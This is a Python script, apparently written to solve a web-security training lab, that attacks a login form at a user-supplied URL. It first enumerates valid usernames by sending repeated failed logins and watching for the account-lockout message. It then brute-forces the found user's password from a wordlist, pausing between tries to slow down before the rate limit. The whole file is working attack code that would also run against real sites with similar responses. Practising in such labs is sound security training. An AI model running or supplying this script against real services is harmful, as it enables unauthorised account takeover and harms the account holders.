import requests
from time import sleep
import os

def get_password_wordlist() -> list[str]:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    passwords_path = os.path.join(parent_dir, '../wordlists', 'passwords.txt')
    with open(passwords_path, 'r') as f:
        return f.read().splitlines()
    
def get_username_wordlist() -> list[str]:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    users_path = os.path.join(parent_dir, '../wordlists', 'users.txt')
    with open(users_path, 'r') as f:
        return f.read().splitlines()
    

LAB_URL = input("Enter the lab URL: ")
passwords = get_password_wordlist()
usernames = get_username_wordlist()

def find_valid_user() -> str:
    for username in usernames:
        data = {
            "username": username,
            "password": "a"
        }
        print(f"Trying username: {username}")
        for i in range(1,5):
            r = requests.post(f"{LAB_URL}/login", data=data)
            if "You have made too many incorrect login attempts" in r.text:
                print(f"Found valid username: {username}")
                return username

def find_valid_password(username: str) -> str:
    for password in passwords:
        data = {
            "username": username,
            "password": password
        }
        r = requests.post(f"{LAB_URL}/login", data=data)
        if "Invalid username or password." not in r.text and "You have made too many incorrect login attempts" not in r.text:
            print(f"Found valid password: {password} for user: {username}")
            return password
        sleep(1)  # To avoid hitting the rate limit too quickly

    
   
if __name__ == "__main__":
    valid_user = find_valid_user()
    if valid_user:
        find_valid_password(valid_user)
    else:
        print("No valid user found.")